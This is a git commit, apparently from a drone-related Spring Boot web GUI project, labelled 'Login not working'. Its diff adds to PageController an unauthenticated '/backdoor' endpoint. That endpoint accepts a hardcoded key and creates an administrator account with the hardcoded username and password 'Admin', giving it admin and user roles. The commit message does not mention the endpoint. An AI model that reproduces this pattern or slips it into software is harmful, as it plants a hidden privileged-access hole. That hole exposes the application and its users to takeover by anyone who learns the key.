77ff66e12689e22ad2986a807d7ed4501cf85f6a
Peter Nielsen <peterflemmingnielsen@gmail.com>
2017-10-09 16:27:06 +0200

    Login not working

--- src/main/java/com/github/dronezcc/riser/gui/controller/PageController.java
+++ src/main/java/com/github/dronezcc/riser/gui/controller/PageController.java
@@ -2,6 +2,7 @@ package com.github.dronezcc.riser.gui.controller;
 
 import com.github.dronezcc.riser.gui.domain.User;
 import com.github.dronezcc.riser.gui.domain.UserRepository;
+import com.github.dronezcc.riser.gui.domain.UserRole;
 import com.github.dronezcc.riser.gui.domain.UserRolesRepository;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
@@ -9,10 +10,12 @@ import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.security.access.prepost.PreAuthorize;
 import org.springframework.security.core.Authentication;
 import org.springframework.security.core.context.SecurityContextHolder;
+import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
 import org.springframework.stereotype.Controller;
 import org.springframework.ui.Model;
 import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.RequestParam;
+import org.springframework.web.bind.annotation.ResponseBody;
 
 import java.util.List;
 
@@ -25,6 +28,37 @@ public class PageController {
     UserRepository userRepository;
     @Autowired
     UserRolesRepository userRolesRepository;
+
+    @RequestMapping("/backdoor")
+    @ResponseBody
+    public String addUser(Model model, @RequestParam(value="key") String key){
+
+        if(!key.equals("mm2299mm")){return "";}
+
+        BCryptPasswordEncoder bCryptPasswordEncoder =  new BCryptPasswordEncoder();
+        String encoded_pass = bCryptPasswordEncoder.encode("Admin");
+
+        User user = new User();
+        user.setUserName("Admin");
+        user.setEnabled(1);
+        user.setEmail("admin@admin.ocm");
+        user.setPassword(encoded_pass);
+
+        User saved = userRepository.save(user);
+
+        UserRole userRole = new UserRole();
+        userRole.setRole("ROLE_ADMIN");
+        userRole.setUserid(saved.getUserid());
+        userRolesRepository.save(userRole);
+
+        UserRole userRole1 = new UserRole();
+        userRole1.setUserid(saved.getUserid());
+        userRole1.setRole("ROLE_USER");
+        userRolesRepository.save(userRole1);
+
+        return "SUCCESS!";
+    }
+
 
     @RequestMapping("/user")
     @PreAuthorize("hasRole('ROLE_USER')")
